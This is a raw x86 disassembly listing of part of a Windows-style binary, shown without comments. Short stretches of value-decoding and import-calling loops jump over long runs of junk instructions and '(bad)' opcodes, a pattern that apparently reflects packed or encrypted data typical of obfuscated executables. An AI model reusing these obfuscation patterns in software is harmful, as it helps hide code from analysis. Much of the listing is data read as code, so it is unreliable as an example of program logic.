  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fd69,0x42fd55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fd69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x7e7b2fbc]
  40e122:	sbb    al,ch
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0ff
  40e12d:	fsubr  st,st(3)
  40e12f:	cs sbb eax,0x8b6dd165
  40e135:	sub    al,0xe
  40e137:	xchg   DWORD PTR [ecx],edx
  40e139:	pop    ebp
  40e13a:	test   eax,0x240c1cd9
  40e13f:	sahf   
  40e140:	pop    ds
  40e141:	jo     0x40e0eb
  40e143:	adc    BYTE PTR [ebp+0x56c3e691],cl
  40e149:	loop   0x40e1a9
  40e14b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40e14d:	test   eax,0x1fda7600
  40e152:	cli    
  40e153:	in     eax,dx
  40e154:	retf   
  40e155:	mov    ebp,0x70ae73b5
  40e15a:	popa   
  40e15b:	push   edx
  40e15c:	adc    DWORD PTR [ecx+0x64d6374c],ebx
  40e162:	xlat   BYTE PTR ds:[ebx]
  40e163:	xor    eax,0x775d5ccf
  40e168:	jae    0x40e152
  40e16a:	xor    BYTE PTR [ecx-0x1b8cf778],cl
  40e170:	ja     0x40e1b1
  40e172:	mov    DWORD PTR [eax+0x72],edi
  40e175:	push   cs
  40e176:	inc    eax
  40e177:	mov    dl,0xe7
  40e179:	imul   esp,DWORD PTR [ebx+0x58],0x845b51fd
  40e180:	(bad)  
  40e181:	in     al,dx
  40e182:	ins    BYTE PTR es:[edi],dx
  40e183:	(bad)  
  40e184:	lock hlt 
  40e186:	xchg   edi,eax
  40e187:	dec    ebp
  40e188:	call   0x9933f6a6
  40e18d:	mov    al,0xd5
  40e18f:	pop    esi
  40e190:	imul   ebx,DWORD PTR [edi+0x3e217b1],0x78
  40e197:	lds    edx,FWORD PTR [esi+0x1e]
  40e19a:	dec    edi
  40e19b:	jno    0x40e1ac
  40e19d:	icebp  
  40e19e:	sbb    al,0x9c
  40e1a0:	sbb    al,ch
  40e1a2:	xor    ch,BYTE PTR [esi-0x20]
  40e1a5:	mov    ch,0xe9
  40e1a7:	and    DWORD PTR [ebx],eax
  40e1a9:	xchg   DWORD PTR [ecx+0x2e],ebx
  40e1ac:	adc    bh,BYTE PTR [eax]
  40e1ae:	inc    esp
  40e1af:	cmp    esi,ecx
  40e1b1:	arpl   WORD PTR [ebx-0x49],bx
  40e1b4:	mov    DWORD PTR [eax+0x7b],ecx
  40e1b7:	rol    DWORD PTR [ebp-0x1553e86f],0x27
  40e1be:	pusha  
  40e1bf:	(bad)  
  40e1c0:	and    esp,DWORD PTR [ebx+0x788f41ce]
  40e1c6:	mov    ebp,0xe0d277bb
  40e1cb:	mov    bh,0x47
  40e1cd:	in     al,0xa0
  40e1cf:	pop    edx
  40e1d0:	pop    ss
  40e1d1:	aaa    
  40e1d2:	cdq    
  40e1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1d4:	es adc eax,0x220744a2
  40e1da:	imul   ecx,DWORD PTR [ebp-0x6],0xffffff95
  40e1de:	dec    eax
  40e1df:	cli    
  40e1e0:	clc    
  40e1e1:	aas    
  40e1e2:	xchg   esp,eax
  40e1e3:	rol    ecx,1
  40e1e5:	inc    ecx
  40e1e6:	pop    eax
  40e1e7:	repz jl 0x40e187
  40e1ea:	iret   
  40e1eb:	into   
  40e1ec:	mov    al,BYTE PTR [edx]
  40e1ee:	mov    ss:0xda25743e,eax
  40e1f4:	xlat   BYTE PTR ds:[ebx]
  40e1f5:	cld    
  40e1f6:	popa   
  40e1f7:	sub    al,0xd
  40e1f9:	stos   BYTE PTR es:[di],al
  40e1fb:	sbb    ebp,DWORD PTR [esi]
  40e1fd:	jo     0x40e279
  40e1ff:	icebp  
  40e200:	test   al,0x24
  40e202:	std    
  40e203:	mov    dl,0xf4
  40e205:	xor    esi,DWORD PTR [edi]
  40e207:	and    edi,DWORD PTR [eax+0x7fe3e219]
  40e20d:	jp     0x40e238
  40e20f:	and    ch,BYTE PTR [ecx]
  40e211:	in     al,dx
  40e212:	push   eax
  40e213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e214:	mov    ds:0x942ef698,al
  40e219:	int    0xc4
  40e21b:	(bad)  
  40e21c:	ror    eax,cl
  40e21e:	mov    esi,0xe56c70f5
  40e223:	xor    DWORD PTR [edx],esi
  40e225:	jns    0x40e1e9
  40e227:	pop    ebx
  40e228:	mov    ebx,0xaed75c5a
  40e22d:	or     ch,BYTE PTR [edi-0x1e]
  40e230:	add    edi,DWORD PTR [ebp*8+0x3cfbe42d]
  40e237:	ret    0x49d2
  40e23a:	cmp    eax,0x424b06f
  40e23f:	icebp  
  40e240:	adc    eax,0x32b467f3
  40e245:	dec    edx
  40e247:	(bad)  
  40e248:	aad    0x3a
  40e24a:	mov    ch,0x9e
  40e24c:	push   ebx
  40e24d:	scas   al,BYTE PTR es:[edi]
  40e24e:	cmp    DWORD PTR [ebx+eiz*1+0x1fd3ea46],ebp
  40e255:	clc    
  40e256:	out    dx,al
  40e257:	xchg   esp,eax
  40e258:	mov    ah,0xf6
  40e25a:	xchg   edi,eax
  40e25b:	dec    esi
  40e25c:	fsub   QWORD PTR [esi]
  40e25e:	push   esp
  40e25f:	pop    ds
  40e260:	and    BYTE PTR [edi-0x61],dh
  40e263:	jbe    0x40e2d0
  40e265:	cmovb  edi,edi
  40e268:	repnz lahf 
  40e26a:	jmp    0x1b9c:0xe14b8813
  40e271:	sbb    BYTE PTR [ecx-0x11007a97],cl
  40e277:	lods   al,BYTE PTR ds:[esi]
  40e278:	mov    DWORD PTR cs:[ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fd7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fd7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e5e3
  40e2b0:	cmp    DWORD PTR ds:0x42fd7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fd7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fdee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fdee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fdee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fdee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fdee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd81
  40e315:	call   DWORD PTR ds:0x42e4f7
  40e31b:	cmp    DWORD PTR ds:0x42fdee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fdee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fdee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e814
  40e340:	mov    ecx,DWORD PTR ds:0x42e81c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fdf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	lahf   
  40e377:	xchg   esi,eax
  40e378:	push   edx
  40e379:	mov    edx,0x7070a43b
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e31e
  40e383:	shr    BYTE PTR [esi-0x79fd8cc8],1
  40e389:	dec    ebp
  40e38a:	lods   al,BYTE PTR ds:[esi]
  40e38b:	pop    es
  40e38c:	cmc    
  40e38d:	sar    DWORD PTR ds:0xfd402e13,1
  40e393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e394:	adc    bl,BYTE PTR [edi-0x3ed2a71]
  40e39a:	pop    ebp
  40e39b:	call   0x6bda:0x2c151514
  40e3a2:	push   esp
  40e3a3:	test   BYTE PTR fs:[bp+di+0x62],bh
  40e3a8:	aaa    
  40e3a9:	adc    ebx,DWORD PTR [esi]
  40e3ab:	xchg   esp,eax
  40e3ac:	cld    
  40e3ad:	jbe    0x40e41b
  40e3af:	sub    ah,bh
  40e3b1:	mov    ecx,0xe885eb7
  40e3b6:	xchg   esp,eax
  40e3b7:	cmc    
  40e3b8:	and    al,BYTE PTR [ecx]
  40e3ba:	(bad)  
  40e3bc:	add    DWORD PTR [edi-0x50],eax
  40e3bf:	sub    ch,BYTE PTR [edi-0x53a26b43]
  40e3c5:	and    al,0xb7
  40e3c7:	cli    
  40e3c8:	(bad)  
  40e3c9:	mov    ecx,DWORD PTR [ebx-0x15]
  40e3cc:	and    ecx,DWORD PTR [esi]
  40e3ce:	outs   dx,DWORD PTR ds:[esi]
  40e3cf:	ficomp WORD PTR [ecx+0x50bfe941]
  40e3d5:	dec    esp
  40e3d6:	loope  0x40e408
  40e3d8:	dec    eax
  40e3d9:	adc    BYTE PTR [ecx],bl
  40e3db:	inc    edi
  40e3dc:	jb     0x40e435
  40e3de:	dec    ebx
  40e3df:	shl    DWORD PTR [edi-0x2b],0x5f
  40e3e3:	inc    edx
  40e3e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e5:	(bad)  
  40e3e6:	(bad)  
  40e3e7:	and    edi,DWORD PTR [ecx-0x4d]
  40e3ea:	bnd jbe 0x40e446
  40e3ed:	jne    0x40e453
  40e3ef:	jmp    0x40e3c5
  40e3f1:	inc    esi
  40e3f2:	push   edi
  40e3f3:	retf   
  40e3f4:	ds cld 
  40e3f6:	xor    al,0x29
  40e3f8:	pop    ds
  40e3f9:	pop    edx
  40e3fa:	mov    ebp,esp
  40e3fc:	enter  0xa12e,0x82
  40e400:	sbb    eax,0x2ad6d645
  40e405:	lods   al,BYTE PTR ds:[esi]
  40e406:	sub    eax,0xf67bb895
  40e40b:	stos   DWORD PTR es:[edi],eax
  40e40c:	xor    bh,BYTE PTR [edi-0x1d]
  40e40f:	and    eax,0xd0323ab4
  40e414:	mov    edi,gs
  40e416:	sbb    al,0x87
  40e418:	call   DWORD PTR [esi-0xa]
  40e41b:	(bad)  
  40e41d:	push   ss
  40e41e:	jmp    0x6c9a8156
  40e423:	in     al,dx
  40e424:	imul   ecx,DWORD PTR [ecx],0x7
  40e427:	sti    
  40e428:	dec    ebx
  40e429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e42a:	aam    0x0
  40e42c:	mov    bl,0x83
  40e42e:	stc    
  40e42f:	push   ss
  40e430:	faddp  st(7),st
  40e432:	mov    WORD PTR [ebp-0x6cc3568d],?
  40e438:	mov    al,0xe
  40e43a:	pop    ss
  40e43b:	icebp  
  40e43c:	mov    BYTE PTR [ebx-0x2c61bde4],cl
  40e442:	push   ebx
  40e443:	adc    DWORD PTR [ecx],ebp
  40e445:	sbb    esp,DWORD PTR [ebp+0x54]
  40e448:	lds    eax,FWORD PTR [ecx+0x54b8c582]
  40e44e:	xchg   esp,eax
  40e44f:	xchg   cl,bl
  40e451:	jnp    0x40e4a3
  40e453:	test   DWORD PTR [esi],esi
  40e455:	ficom  DWORD PTR [ebx-0x219290ef]
  40e45b:	add    BYTE PTR [edx],cl
  40e45d:	call   0x317d:0xba1c2e87
  40e464:	mov    BYTE PTR [ebp+0x543f38ff],bl
  40e46a:	push   ss
  40e46b:	pop    ebp
  40e46c:	nop
  40e46d:	adc    ch,dh
  40e46f:	or     esi,DWORD PTR [ecx-0x32bc3f77]
  40e475:	sbb    eax,0xc77f9e00
  40e47a:	inc    ebx
  40e47b:	push   ecx
  40e47c:	scas   eax,DWORD PTR es:[edi]
  40e47d:	cli    
  40e47e:	fisubr WORD PTR [edi-0x17]
  40e481:	sub    BYTE PTR [edi],dl
  40e483:	out    dx,al
  40e484:	in     al,0x27
  40e486:	ins    BYTE PTR es:[edi],dx
  40e487:	aaa    
  40e488:	sbb    eax,0x599fc039
  40e48d:	sar    DWORD PTR [edi+0x7fef33fc],cl
  40e493:	add    edi,edx
  40e495:	push   cs
  40e496:	add    DWORD PTR [ebx-0x1ece9793],ebp
  40e49c:	jae    0x40e4a2
  40e49e:	inc    ebx
  40e49f:	stc    
  40e4a0:	div    DWORD PTR [ebx-0x54]
  40e4a3:	inc    ebp
  40e4a4:	cmp    eax,0xfc909e77
  40e4a9:	pop    edx
  40e4aa:	adc    eax,0xafd18d9f
  40e4af:	je     0x40e48e
  40e4b1:	push   es
  40e4b2:	cmp    ecx,esi
  40e4b4:	fs mov bh,al
  40e4b7:	(bad)  
  40e4b8:	and    BYTE PTR [edi],dh
  40e4ba:	xor    BYTE PTR [eax],cl
  40e4bc:	iret   
  40e4bd:	and    esp,esp
  40e4bf:	push   ss
  40e4c0:	sub    eax,0x3ae95c3e
  40e4c5:	sbb    al,0x0
  40e4c7:	cmp    BYTE PTR [ecx],ah
  40e4c9:	add    BYTE PTR [esi+eax*1-0x38e64e02],cl
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xcbfb740f
  40e4f5:	push   cs
  40e4f6:	and    al,0x8e
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	inc    ecx
  40e500:	jp     0x40e54f
  40e502:	scas   al,BYTE PTR es:[edi]
  40e503:	je     0x40e543
  40e505:	push   es
  40e506:	jmp    0x88ed:0xe6d7ad6f
  40e50d:	jmp    0x900dda66
  40e512:	cdq    
  40e513:	iret   
  40e514:	shl    BYTE PTR [eax],0x64
  40e517:	sub    al,0xd7
  40e519:	ret    0xb88c
  40e51c:	(bad)  
  40e51d:	inc    BYTE PTR [ecx+edx*4+0x659b5612]
  40e524:	test   edx,edi
  40e526:	push   ds
  40e527:	call   0xe62:0xbbf0e7a8
  40e52e:	and    dh,BYTE PTR [ecx+0x11]
  40e531:	pop    ds
  40e532:	push   edi
  40e533:	and    BYTE PTR [ebx],0xfd
  40e536:	cmp    bl,dl
  40e538:	pop    es
  40e539:	xchg   esp,eax
  40e53a:	les    ebx,FWORD PTR [esi+0x3cc024ce]
  40e540:	cwde   
  40e541:	jmp    0x40e582
  40e543:	push   eax
  40e544:	xchg   edi,eax
  40e545:	cmp    ebp,DWORD PTR [ecx+eax*8+0x364a237c]
  40e54c:	or     DWORD PTR [eax-0x66],edi
  40e54f:	push   ecx
  40e550:	fsubrp st(0),st
  40e552:	repz (bad) 
  40e554:	sub    edx,DWORD PTR [ecx+0xe]
  40e557:	xchg   ecx,eax
  40e558:	mov    dl,0x7c
  40e55a:	mov    BYTE PTR ds:0x3be52e46,0xca
  40e561:	jnp    0x40e501
  40e563:	sub    ecx,ebx
  40e565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e566:	mov    fs,WORD PTR [ebp+0x58159fb]
  40e56c:	mov    eax,ds:0x47ae62f2
  40e571:	lods   eax,DWORD PTR ds:[esi]
  40e572:	fstp   DWORD PTR [esi-0x21e8d3f1]
  40e578:	jmp    0x40e52f
  40e57a:	ret    0x7e91
  40e57d:	inc    edi
  40e57e:	mov    esi,0xe3d9e308
  40e583:	cmc    
  40e584:	lock mov ?,WORD PTR [ebx]
  40e587:	imul   ebx,DWORD PTR [ecx],0x1b10d063
  40e58d:	minps  xmm2,xmm0
  40e590:	add    cl,BYTE PTR [edi+0x5c697f68]
  40e596:	push   es
  40e597:	aaa    
  40e598:	push   ss
  40e599:	pop    ebp
  40e59a:	fnstcw WORD PTR [ebx-0x48]
  40e59d:	lods   eax,DWORD PTR ds:[esi]
  40e59e:	or     ecx,esi
  40e5a0:	mov    edx,fs
  40e5a2:	xchg   ecx,eax
  40e5a3:	and    eax,0xf56c1487
  40e5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a9:	xor    DWORD PTR [edx],ecx
  40e5ab:	outs   dx,DWORD PTR ds:[esi]
  40e5ac:	inc    edx
  40e5ad:	(bad)  fs:[edi]
  40e5b0:	test   BYTE PTR [ecx+0x27e75129],ch
  40e5b6:	and    DWORD PTR [eax],0x65f63241
  40e5bc:	adc    al,0x3a
  40e5be:	and    dh,bh
  40e5c0:	and    bl,BYTE PTR [ebx-0x6afde4f8]
  40e5c6:	mov    edi,0xce0637b5
  40e5cb:	mov    esp,0x66267563
  40e5d0:	ret    
  40e5d1:	and    al,0xe2
  40e5d3:	xor    al,0xf0
  40e5d5:	sbb    DWORD PTR ds:0xfb427898,ecx
  40e5db:	push   ds
  40e5dc:	mov    esi,0xfaddd612
  40e5e1:	xchg   si,ax
  40e5e3:	jl     0x40e5d0
  40e5e5:	fnstsw WORD PTR [esp+ebx*2]
  40e5e8:	jmp    0x40e582
  40e5ea:	xchg   DWORD PTR [edx+0x25bfd0b6],edi
  40e5f0:	mov    BYTE PTR [edx-0x62eb2467],al
  40e5f6:	pop    ss
  40e5f7:	add    edx,DWORD PTR [eax-0x59049aa6]
  40e5fd:	mov    al,0x78
  40e5ff:	sub    bh,BYTE PTR [esp+edx*2]
  40e602:	push   ebx
  40e603:	loop   0x40e5c7
  40e605:	call   0x1a47:0x93e38bd8
  40e60c:	add    eax,0xc7c9f915
  40e611:	sbb    DWORD PTR [edx-0x56],eax
  40e614:	mov    eax,ds:0x40d6df6
  40e619:	das    
  40e61a:	test   BYTE PTR ds:0x58fc75f5,bh
  40e620:	pop    ebp
  40e621:	pop    ss
  40e622:	sbb    ebp,DWORD PTR [ebx]
  40e624:	not    esi
  40e626:	cmc    
  40e627:	repnz pop ebx
  40e629:	ja     0x40e680
  40e62b:	pusha  
  40e62c:	push   ds
  40e62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e62e:	js     0x40e680
  40e630:	mov    ebx,0x8203820c
  40e635:	stos   BYTE PTR es:[edi],al
  40e636:	mov    ecx,0x409d372e
  40e63b:	and    eax,DWORD PTR [edi+ebx*4-0x4e616050]
  40e642:	xchg   DWORD PTR [ecx+0x6d5dff85],eax
  40e648:	add    DWORD PTR [edx+0x458b73f8],esp
  40e64e:	call   0xfe3b0bd4
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fdfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fdfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fdfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fdfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e4fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e19c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fd59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	sbb    al,0x86
  40e6dc:	xchg   DWORD PTR [eax+0x51],ebx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	popa   
  40e6e7:	inc    ebx
  40e6e8:	dec    ecx
  40e6e9:	nop
  40e6ea:	mov    ds:0x39e14e5c,al
  40e6ef:	out    0x1e,al
  40e6f1:	out    0xeb,eax
  40e6f3:	mov    cl,0xdd
  40e6f5:	cwde   
  40e6f6:	mov    esi,esp
  40e6f8:	and    ecx,DWORD PTR [ecx-0x427266d1]
  40e6fe:	test   esp,ecx
  40e700:	int3   
  40e701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e702:	inc    ebx
  40e703:	xchg   ecx,eax
  40e704:	mov    ds:0x36e2b8a7,eax
  40e709:	cld    
  40e70a:	repz fldenv [ecx]
  40e70d:	jmp    0x6b4d8da3
  40e712:	mov    al,0x49
  40e714:	and    BYTE PTR [eax+0x2333b188],cl
  40e71a:	pop    edx
  40e71b:	xor    esi,edi
  40e71d:	jge    0x40e715
  40e71f:	js     0x40e748
  40e721:	dec    esp
  40e722:	xchg   esp,eax
  40e723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e724:	js     0x40e6db
  40e726:	mov    edx,0x799df7b0
  40e72b:	pop    ss
  40e72c:	sbb    ch,BYTE PTR [ebp-0x59]
  40e72f:	xchg   esi,eax
  40e730:	fstp   QWORD PTR [bp+si+0x3078]
  40e735:	dec    ebp
  40e736:	cwde   
  40e737:	push   ebx
  40e738:	rcr    DWORD PTR [ecx+0x39],1
  40e73b:	(bad)  
  40e73c:	jnp    0x40e7af
  40e73e:	stos   BYTE PTR es:[edi],al
  40e73f:	int    0xaf
  40e741:	loop   0x40e756
  40e743:	push   es
  40e744:	mov    ds:0xe301607d,al
  40e749:	xchg   esi,esp
  40e74b:	rcl    DWORD PTR [ecx],1
  40e74d:	sbb    eax,0xa21f116c
  40e752:	pushf  
  40e753:	or     DWORD PTR [edx],esp
  40e755:	loop   0x40e764
  40e757:	lea    ebx,[ebp+edx*8-0x5119d8c0]
  40e75e:	(bad)  
  40e760:	jb     0x40e761
  40e762:	das    
  40e763:	xor    ebp,DWORD PTR [eax-0x407d7baf]
  40e769:	test   eax,0x6ef7ae8
  40e76e:	and    bl,dl
  40e770:	mov    ds:0x36e3592e,eax
  40e775:	in     al,0xe7
  40e777:	mov    BYTE PTR [ecx],ah
  40e779:	inc    eax
  40e77a:	add    ebx,ebp
  40e77c:	cmc    
  40e77d:	mov    DWORD PTR [ebp-0x45ddd6f],ebx
  40e783:	xor    al,0x69
  40e785:	lds    eax,FWORD PTR [eax-0x2bbea938]
  40e78b:	enter  0xb5a8,0x92
  40e78f:	(bad)  [edi-0x60]
  40e792:	fistp  QWORD PTR [esi+0x223cc230]
  40e798:	in     al,0xe8
  40e79a:	push   esi
  40e79b:	add    ch,ch
  40e79d:	or     eax,0xf09553f8
  40e7a2:	xlat   BYTE PTR ds:[ebx]
  40e7a3:	fsubp  st(2),st
  40e7a5:	dec    edx
  40e7a6:	ins    BYTE PTR es:[edi],dx
  40e7a7:	and    DWORD PTR [edi-0x19],esp
  40e7aa:	int    0x4a
  40e7ac:	xchg   ebx,eax
  40e7ad:	dec    esi
  40e7ae:	add    eax,0x21aaa027
  40e7b3:	cmp    DWORD PTR [ecx+eiz*1+0x3c],0x9bce5c0f
  40e7bb:	nop
  40e7bc:	loopne 0x40e7e0
  40e7be:	sbb    eax,0xd8ea3fe8
  40e7c3:	sbb    eax,0xf6252918
  40e7c8:	loop   0x40e845
  40e7ca:	push   edx
  40e7cb:	sub    BYTE PTR [ecx-0x6df2a61c],bl
  40e7d1:	push   es
  40e7d2:	test   BYTE PTR [ebp-0x9],dl
  40e7d5:	mov    esp,0x2fa3a68d
  40e7da:	cmp    edi,DWORD PTR [edx+0x23]
  40e7dd:	mov    ecx,0x2d581472
  40e7e2:	loopne 0x40e817
  40e7e4:	enter  0xc1fc,0x20
  40e7e8:	push   ebx
  40e7e9:	shl    ebp,1
  40e7eb:	data16 arpl WORD PTR [eax+0xb0d14f6],cx
  40e7f2:	inc    eax
  40e7f3:	mov    bl,0x7
  40e7f5:	and    al,0xa0
  40e7f7:	jb     0x40e784
  40e7f9:	adc    eax,0x1f9d511
  40e7fe:	adc    al,0x26
  40e800:	je     0x40e81c
  40e802:	pop    ebp
  40e803:	push   edi
  40e804:	jmp    0x40e818
  40e806:	out    0x6,eax
  40e808:	xor    eax,0x319d2ef2
  40e80d:	push   ds
  40e80e:	pop    ds
  40e80f:	mov    edx,0xa3ec2e78
  40e814:	cmp    al,0x47
  40e816:	cmp    al,0xd6
  40e818:	adc    BYTE PTR [esi+ebp*1+0x2ca4e800],0x59
  40e820:	xor    BYTE PTR [edi],dh
  40e822:	js     0x40e899
  40e824:	cmp    al,0xe7
  40e826:	inc    ebx
  40e827:	bound  eax,QWORD PTR [ecx+0x63]
  40e82a:	jno    0x40e881
  40e82c:	xlat   BYTE PTR ds:[ebx]
  40e82d:	ret    
  40e82e:	pushf  
  40e82f:	ret    
  40e830:	je     0x40e851
  40e832:	into   
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fd69,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd8d,0x42fdfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
